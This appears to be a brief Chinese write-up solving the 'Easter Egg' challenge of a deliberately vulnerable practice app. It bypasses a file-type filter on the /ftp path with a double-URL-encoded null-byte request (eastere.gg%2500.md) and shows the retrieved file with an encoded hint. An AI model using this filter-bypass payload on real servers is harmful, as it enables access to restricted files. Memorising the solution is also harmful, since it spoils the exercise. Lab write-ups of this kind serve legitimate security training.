---
title: Easter Egg
description: 尝试绕过文件类型的文件名空字节攻击时，也尝试使用多层 URL 编码推迟被解析为空字节的位置。
---

- 描述：Find the hidden easter egg.
- 在已知的 ```/ftp``` 路径中使用双重 URL 编码的文件名空字节截断绕过文件名过滤
    ```GET /ftp/eastere.gg%2500.md HTTP/1.1```
    得到
    ```md
    "Congratulations, you found the easter egg!"
    - The incredibly funny developers

    ...

    ...

    ...

    Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:

    L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==

    Good luck, egg hunter!
    ```